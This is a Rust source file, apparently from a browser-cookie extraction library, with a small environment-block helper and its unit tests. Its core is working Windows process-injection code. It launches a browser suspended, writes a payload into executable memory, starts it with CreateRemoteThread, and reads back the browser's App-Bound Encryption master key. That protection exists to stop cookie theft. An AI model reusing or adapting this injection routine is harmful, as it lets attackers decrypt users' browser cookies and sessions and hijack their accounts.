use anyhow::{anyhow, bail, Result};
use std::ffi::{OsStr, OsString};
use std::path::{Path, PathBuf};
use std::time::Duration;
use zeroize::Zeroizing;

use super::constants::*;
use super::pe::find_export_file_offset;
use crate::common::deadline::BoundaryRuntime;

const DEFAULT_WAIT_TIMEOUT: Duration = Duration::from_secs(30);
const ENV_ENC_KEY_B64: &str = "HBD_ABE_ENC_B64";

fn to_utf16_key_val<K: AsRef<OsStr>, V: AsRef<OsStr>>(k: K, v: V) -> (Vec<u16>, Vec<u16>) {
  #[cfg(windows)]
  {
    use std::os::windows::ffi::OsStrExt;
    (
      k.as_ref().encode_wide().collect(),
      v.as_ref().encode_wide().collect(),
    )
  }
  #[cfg(not(windows))]
  {
    (
      k.as_ref().to_string_lossy().encode_utf16().collect(),
      v.as_ref().to_string_lossy().encode_utf16().collect(),
    )
  }
}

fn ascii_fold_utf16(units: &[u16]) -> Vec<u16> {
  units
    .iter()
    .map(|&c| {
      if (b'a' as u16..=b'z' as u16).contains(&c) {
        c - 32
      } else {
        c
      }
    })
    .collect()
}

/// Constructs a Windows Unicode environment block (UTF-16) from an iterator of
/// environment variables, applying the provided key-value overrides without
/// mutating the parent process environment.
///
/// The returned buffer contains null-terminated `KEY=VALUE\0` strings sorted
/// case-insensitively (ordinal ASCII folding) by variable name, terminated by a final null character (`\0\0`).
pub fn create_environment_block<I, K, V>(base_vars: I, overrides: &[(&str, &str)]) -> Vec<u16>
where
  I: IntoIterator<Item = (K, V)>,
  K: AsRef<OsStr>,
  V: AsRef<OsStr>,
{
  use std::collections::BTreeMap;

  // Ordinal case-insensitive key ordering to satisfy Windows environment block requirements.
  let mut env_map: BTreeMap<Vec<u16>, (Vec<u16>, Vec<u16>)> = BTreeMap::new();

  for (k, v) in base_vars {
    let (key_u16, val_u16) = to_utf16_key_val(k, v);
    let key_folded = ascii_fold_utf16(&key_u16);
    env_map.insert(key_folded, (key_u16, val_u16));
  }

  for &(k, v) in overrides {
    let (key_u16, val_u16) = to_utf16_key_val(k, v);
    let key_folded = ascii_fold_utf16(&key_u16);
    env_map.insert(key_folded, (key_u16, val_u16));
  }

  let mut block = Vec::new();
  for (_key_folded, (k, v)) in env_map {
    block.extend(k);
    block.push('=' as u16);
    block.extend(v);
    block.push(0);
  }

  if block.is_empty() {
    block.push(0);
  }
  block.push(0);
  block
}

#[cfg(test)]
pub fn parse_environment_block(block: &[u16]) -> Vec<(String, String)> {
  let mut result = Vec::new();
  let mut start = 0;
  while start < block.len() {
    if block[start] == 0 {
      break;
    }
    if let Some(end_rel) = block[start..].iter().position(|&c| c == 0) {
      let end = start + end_rel;
      let entry = String::from_utf16_lossy(&block[start..end]);
      if let Some((k, v)) = entry.split_once('=') {
        result.push((k.to_string(), v.to_string()));
      }
      start = end + 1;
    } else {
      break;
    }
  }
  result
}

struct TempUddGuard {
  path: PathBuf,
}

impl TempUddGuard {
  fn create() -> Result<Self> {
    let mut temp = std::env::temp_dir();
    let rand_suffix: u64 = rand::random();
    temp.push(format!("rookie-abe-udd-{:016x}", rand_suffix));
    std::fs::create_dir_all(&temp)?;
    Ok(Self { path: temp })
  }
}

impl Drop for TempUddGuard {
  fn drop(&mut self) {
    let _ = std::fs::remove_dir_all(&self.path);
  }
}

#[cfg(windows)]
struct ProcessHandlesGuard {
  h_process: windows::Win32::Foundation::HANDLE,
  h_thread: windows::Win32::Foundation::HANDLE,
  terminated: bool,
}

#[cfg(windows)]
impl ProcessHandlesGuard {
  fn new(
    h_process: windows::Win32::Foundation::HANDLE,
    h_thread: windows::Win32::Foundation::HANDLE,
  ) -> Self {
    Self {
      h_process,
      h_thread,
      terminated: false,
    }
  }

  fn terminate(&mut self, exit_code: u32) {
    use windows::Win32::System::Threading::{TerminateProcess, WaitForSingleObject};

    if !self.terminated && !self.h_process.is_invalid() {
      unsafe {
        let _ = TerminateProcess(self.h_process, exit_code);
        let _ = WaitForSingleObject(self.h_process, 2000);
      }
      self.terminated = true;
    }
  }
}

#[cfg(windows)]
impl Drop for ProcessHandlesGuard {
  fn drop(&mut self) {
    use windows::Win32::Foundation::CloseHandle;

    self.terminate(1);
    if !self.h_thread.is_invalid() {
      unsafe {
        let _ = CloseHandle(self.h_thread);
      }
    }
    if !self.h_process.is_invalid() {
      unsafe {
        let _ = CloseHandle(self.h_process);
      }
    }
  }
}

#[cfg(windows)]
struct RemoteThreadGuard(windows::Win32::Foundation::HANDLE);

#[cfg(windows)]
impl Drop for RemoteThreadGuard {
  fn drop(&mut self) {
    use windows::Win32::Foundation::CloseHandle;
    if !self.0.is_invalid() {
      unsafe {
        let _ = CloseHandle(self.0);
      }
    }
  }
}

#[cfg(windows)]
fn patch_preresolved_imports(payload: &[u8]) -> Result<Vec<u8>> {
  use windows::core::PCSTR;
  use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

  let kernel32 = unsafe { GetModuleHandleA(PCSTR(c"kernel32.dll".as_ptr().cast())) }?;
  let ntdll = unsafe { GetModuleHandleA(PCSTR(c"ntdll.dll".as_ptr().cast())) }?;

  let p_load_library_a =
    unsafe { GetProcAddress(kernel32, PCSTR(c"LoadLibraryA".as_ptr().cast())) };
  let p_get_proc_address =
    unsafe { GetProcAddress(kernel32, PCSTR(c"GetProcAddress".as_ptr().cast())) };
  let p_virtual_alloc = unsafe { GetProcAddress(kernel32, PCSTR(c"VirtualAlloc".as_ptr().cast())) };
  let p_virtual_protect =
    unsafe { GetProcAddress(kernel32, PCSTR(c"VirtualProtect".as_ptr().cast())) };
  let p_nt_flush_ic =
    unsafe { GetProcAddress(ntdll, PCSTR(c"NtFlushInstructionCache".as_ptr().cast())) };

  let load_library_a =
    p_load_library_a.ok_or_else(|| anyhow!("failed to resolve LoadLibraryA"))? as usize;
  let get_proc_address =
    p_get_proc_address.ok_or_else(|| anyhow!("failed to resolve GetProcAddress"))? as usize;
  let virtual_alloc =
    p_virtual_alloc.ok_or_else(|| anyhow!("failed to resolve VirtualAlloc"))? as usize;
  let virtual_protect =
    p_virtual_protect.ok_or_else(|| anyhow!("failed to resolve VirtualProtect"))? as usize;
  let nt_flush_ic =
    p_nt_flush_ic.ok_or_else(|| anyhow!("failed to resolve NtFlushInstructionCache"))? as usize;

  if payload.len() < BOOTSTRAP_IMPORT_NTFLUSHIC_OFFSET + 8 {
    bail!("payload too small for import patch");
  }

  let mut patched = payload.to_vec();
  let write_addr = |buf: &mut [u8], offset: usize, addr: usize| {
    buf[offset..offset + 8].copy_from_slice(&(addr as u64).to_le_bytes());
  };

  write_addr(
    &mut patched,
    BOOTSTRAP_IMPORT_LOADLIBRARYA_OFFSET,
    load_library_a,
  );
  write_addr(
    &mut patched,
    BOOTSTRAP_IMPORT_GETPROCADDRESS_OFFSET,
    get_proc_address,
  );
  write_addr(
    &mut patched,
    BOOTSTRAP_IMPORT_VIRTUALALLOC_OFFSET,
    virtual_alloc,
  );
  write_addr(
    &mut patched,
    BOOTSTRAP_IMPORT_VIRTUALPROTECT_OFFSET,
    virtual_protect,
  );
  write_addr(&mut patched, BOOTSTRAP_IMPORT_NTFLUSHIC_OFFSET, nt_flush_ic);

  Ok(patched)
}

/// Spawns a target browser executable in suspended mode, injects the ABE extraction payload,
/// issues the COM elevation DecryptData call inside the browser context, and reads back the 32-byte master key.
#[cfg(windows)]
pub fn inject_and_extract_key(
  exe_path: &Path,
  payload: &[u8],
  encrypted_key_b64: &str,
  runtime: &BoundaryRuntime<'_>,
) -> Result<Zeroizing<Vec<u8>>> {
  use std::os::windows::ffi::OsStrExt;
  use windows::core::{PCWSTR, PWSTR};
  use windows::Win32::Foundation::{WAIT_OBJECT_0, WAIT_TIMEOUT};
  use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
  use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
  };
  use windows::Win32::System::Threading::{
    CreateProcessW, CreateRemoteThread, ResumeThread, WaitForSingleObject, CREATE_SUSPENDED,
    CREATE_UNICODE_ENVIRONMENT, PROCESS_INFORMATION, STARTUPINFOW,
  };

  runtime.check()?;

  let bootstrap_offset = find_export_file_offset(payload, "Bootstrap")?;
  let patched_payload = patch_preresolved_imports(payload)?;

  let env_block =
    create_environment_block(std::env::vars_os(), &[(ENV_ENC_KEY_B64, encrypted_key_b64)]);
  let udd_guard = TempUddGuard::create()?;

  let cmd_line = format!(
    "\"{}\" --user-data-dir=\"{}\"",
    exe_path.display(),
    udd_guard.path.display()
  );
  let mut cmd_line_w: Vec<u16> = cmd_line.encode_utf16().chain(std::iter::once(0)).collect();
  let app_name_w: Vec<u16> = exe_path
    .as_os_str()
    .encode_wide()
    .chain(std::iter::once(0))
    .collect();

  let si = STARTUPINFOW {
    cb: std::mem::size_of::<STARTUPINFOW>() as u32,
    ..Default::default()
  };
  let mut pi = PROCESS_INFORMATION::default();

  let creation_flags = CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT;
  let created = unsafe {
    CreateProcessW(
      PCWSTR(app_name_w.as_ptr()),
      PWSTR(cmd_line_w.as_mut_ptr()),
      None,
      None,
      false,
      creation_flags,
      Some(env_block.as_ptr().cast()),
      None,
      &si,
      &mut pi,
    )
  };

  if created.is_err() {
    bail!(
      "CreateProcessW failed for browser executable {:?}: {:?}",
      exe_path,
      created.err()
    );
  }

  let mut proc_guard = ProcessHandlesGuard::new(pi.hProcess, pi.hThread);

  runtime.check()?;

  let remote_base = unsafe {
    VirtualAllocEx(
      pi.hProcess,
      None,
      patched_payload.len(),
      MEM_COMMIT | MEM_RESERVE,
      PAGE_EXECUTE_READWRITE,
    )
  };

  if remote_base.is_null() {
    bail!("VirtualAllocEx failed in target browser process");
  }

  let mut written = 0;
  let write_ok = unsafe {
    WriteProcessMemory(
      pi.hProcess,
      remote_base,
      patched_payload.as_ptr() as *const _,
      patched_payload.len(),
      Some(&mut written),
    )
  };

  if write_ok.is_err() || written != patched_payload.len() {
    bail!(
      "WriteProcessMemory short write (wrote {} / {} bytes)",
      written,
      patched_payload.len()
    );
  }

  // Resume the main thread briefly so ntdll loader initialization completes
  unsafe {
    let _ = ResumeThread(pi.hThread);
  }
  let loader_wait = runtime
    .deadline
    .remaining(runtime.clock)
    .min(Duration::from_millis(50));
  runtime.clock.sleep(loader_wait);
  runtime.check()?;

  let entry_addr = (remote_base as usize + bootstrap_offset) as *const ();
  let mut thread_id = 0;
  let remote_thread = unsafe {
    CreateRemoteThread(
      pi.hProcess,
      None,
      0,
      Some(std::mem::transmute::<
        *const (),
        unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
      >(entry_addr)),
      None,
      0,
      Some(&mut thread_id),
    )
  };

  let remote_thread_handle = match remote_thread {
    Ok(h) if !h.is_invalid() => h,
    Err(e) => bail!("CreateRemoteThread failed: {e}"),
    _ => bail!("CreateRemoteThread returned invalid handle"),
  };

  let remote_thread = RemoteThreadGuard(remote_thread_handle);

  const POLL_INTERVAL: Duration = Duration::from_millis(50);
  let loop_start = runtime.clock.now();
  loop {
    runtime.check()?;

    let remaining = runtime.deadline.remaining(runtime.clock);
    let time_elapsed = runtime.clock.now().saturating_duration_since(loop_start);
    let overall_remaining = DEFAULT_WAIT_TIMEOUT.saturating_sub(time_elapsed);

    if overall_remaining.is_zero() {
      bail!(
        "Remote Bootstrap thread timed out after {:?}",
        DEFAULT_WAIT_TIMEOUT
      );
    }

    let wait_slice = remaining.min(overall_remaining).min(POLL_INTERVAL);
    let wait_ms = u32::try_from(wait_slice.as_millis())
      .unwrap_or(u32::MAX)
      .max(1);

    let wait_state = unsafe { WaitForSingleObject(remote_thread.0, wait_ms) };
    if wait_state == WAIT_OBJECT_0 {
      break;
    } else if wait_state == WAIT_TIMEOUT {
      continue;
    } else {
      bail!(
        "Remote Bootstrap thread wait failed (code 0x{:x})",
        wait_state.0
      );
    }
  }

  runtime.check()?;

  // Read scratch result
  let mut hdr = [0u8; 12];
  let mut read_bytes = 0;
  let read_hdr_ok = unsafe {
    ReadProcessMemory(
      pi.hProcess,
      (remote_base as usize + BOOTSTRAP_MARKER_OFFSET) as *const _,
      hdr.as_mut_ptr() as *mut _,
      hdr.len(),
      Some(&mut read_bytes),
    )
  };

  if read_hdr_ok.is_err() || read_bytes != hdr.len() {
    bail!("Failed to read scratch diagnostic header from remote process");
  }

  let marker = hdr[0];
  let status = hdr[1];
  let err_code = hdr[2];
  let hresult = u32::from_le_bytes(hdr[4..8].try_into().unwrap());
  let com_err = u32::from_le_bytes(hdr[8..12].try_into().unwrap());

  let mut scratch = ScratchResult {
    marker,
    status,
    err_code,
    hresult,
    com_err,
    key: None,
  };

  if status == BOOTSTRAP_KEY_STATUS_READY {
    let mut key_buf = vec![0u8; BOOTSTRAP_KEY_LEN];
    let mut key_read_bytes = 0;
    let read_key_ok = unsafe {
      ReadProcessMemory(
        pi.hProcess,
        (remote_base as usize + BOOTSTRAP_KEY_OFFSET) as *const _,
        key_buf.as_mut_ptr() as *mut _,
        key_buf.len(),
        Some(&mut key_read_bytes),
      )
    };
    if read_key_ok.is_ok() && key_read_bytes == BOOTSTRAP_KEY_LEN {
      scratch.key = Some(key_buf);
    }
  }

  // Terminate the temporary browser process
  proc_guard.terminate(0);

  if let Some(key) = scratch.key.take() {
    if key.len() == BOOTSTRAP_KEY_LEN {
      return Ok(Zeroizing::new(key));
    }
  }

  bail!(
    "App-Bound reflective injection did not return valid key: {}",
    format_abe_error(&scratch)
  )
}

#[cfg(not(windows))]
pub fn inject_and_extract_key(
  _exe_path: &Path,
  _payload: &[u8],
  _encrypted_key_b64: &str,
  _runtime: &BoundaryRuntime<'_>,
) -> Result<Zeroizing<Vec<u8>>> {
  bail!("Reflective injection is only available on Windows")
}

#[cfg(test)]
mod tests {
  use super::*;
  use crate::common::deadline::{test_clock::ManualClock, BoundaryRuntime, Deadline};

  #[test]
  fn environment_block_creates_sorted_unicode_block_with_overrides() {
    let base = vec![
      ("PATH", "C:\\Windows"),
      ("TEMP", "C:\\Temp"),
      ("HBD_ABE_ENC_B64", "stale_value"),
    ];
    let overrides = [("HBD_ABE_ENC_B64", "new_fresh_encrypted_blob")];
    let block = create_environment_block(base, &overrides);
    let parsed = parse_environment_block(&block);

    assert_eq!(
      parsed,
      vec![
        (
          "HBD_ABE_ENC_B64".to_string(),
          "new_fresh_encrypted_blob".to_string()
        ),
        ("PATH".to_string(), "C:\\Windows".to_string()),
        ("TEMP".to_string(), "C:\\Temp".to_string()),
      ]
    );
  }

  #[test]
  fn environment_block_preserves_distinct_unicode_keys_under_ordinal_folding() {
    let base = vec![
      ("ß_VAR", "value_sharp_s"),
      ("SS_VAR", "value_double_s"),
      ("mixed_case", "val1"),
      ("MIXED_CASE", "val2_overwritten"),
    ];
    let overrides = [("NEW_VAR", "val3")];
    let block = create_environment_block(base, &overrides);
    let parsed = parse_environment_block(&block);

    // ß and SS must both be preserved as distinct variables under Windows ordinal folding
    assert!(parsed
      .iter()
      .any(|(k, v)| k == "ß_VAR" && v == "value_sharp_s"));
    assert!(parsed
      .iter()
      .any(|(k, v)| k == "SS_VAR" && v == "value_double_s"));
    // Case-insensitive ASCII collision correctly overrides
    let mixed: Vec<_> = parsed
      .iter()
      .filter(|(k, _)| k.eq_ignore_ascii_case("mixed_case"))
      .collect();
    assert_eq!(mixed.len(), 1);
    assert_eq!(mixed[0].1, "val2_overwritten");
  }

  #[test]
  fn environment_block_handles_empty_base() {
    let base: Vec<(String, String)> = Vec::new();
    let overrides = [("HBD_ABE_ENC_B64", "blob123")];
    let block = create_environment_block(base, &overrides);
    let parsed = parse_environment_block(&block);

    assert_eq!(
      parsed,
      vec![("HBD_ABE_ENC_B64".to_string(), "blob123".to_string())]
    );
  }

  #[test]
  fn environment_block_handles_completely_empty() {
    let base: Vec<(String, String)> = Vec::new();
    let overrides: [(&str, &str); 0] = [];
    let block = create_environment_block(base, &overrides);
    assert_eq!(block, vec![0, 0]);
    let parsed = parse_environment_block(&block);
    assert!(parsed.is_empty());
  }

  #[test]
  fn two_parallel_workers_receive_their_own_encrypted_blob_without_parent_mutation() {
    // Invariant: parent environment must never have HBD_ABE_ENC_B64 set
    assert!(std::env::var(ENV_ENC_KEY_B64).is_err());

    let handles: Vec<_> = (0..10)
      .map(|i| {
        std::thread::spawn(move || {
          let blob = format!("encrypted_blob_for_worker_{i}");
          let block = create_environment_block(std::env::vars_os(), &[(ENV_ENC_KEY_B64, &blob)]);
          let parsed = parse_environment_block(&block);
          let found = parsed
            .into_iter()
            .find(|(k, _)| k.eq_ignore_ascii_case(ENV_ENC_KEY_B64))
            .expect("must contain HBD_ABE_ENC_B64");
          assert_eq!(found.1, blob);
          assert!(std::env::var(ENV_ENC_KEY_B64).is_err());
        })
      })
      .collect();

    for h in handles {
      h.join().unwrap();
    }

    assert!(std::env::var(ENV_ENC_KEY_B64).is_err());
  }

  #[test]
  fn parent_environment_unchanged_across_panic_and_cancellation() {
    assert!(std::env::var(ENV_ENC_KEY_B64).is_err());

    let _ = std::panic::catch_unwind(|| {
      let _block =
        create_environment_block(std::env::vars_os(), &[(ENV_ENC_KEY_B64, "blob_will_panic")]);
      panic!("simulated panic");
    });

    assert!(std::env::var(ENV_ENC_KEY_B64).is_err());
  }

  #[test]
  fn deadline_expiry_stops_promptly_without_unbounded_wait() {
    let clock = ManualClock::default();
    let runtime = BoundaryRuntime::new(&clock, Deadline::after(&clock, Duration::from_secs(2)));

    // Advance clock past the 2-second deadline
    clock.advance(Duration::from_secs(3));
    let stop_err = runtime.check().expect_err("deadline must expire");
    assert_eq!(stop_err, crate::common::deadline::BoundaryStop::TimedOut);
  }
}
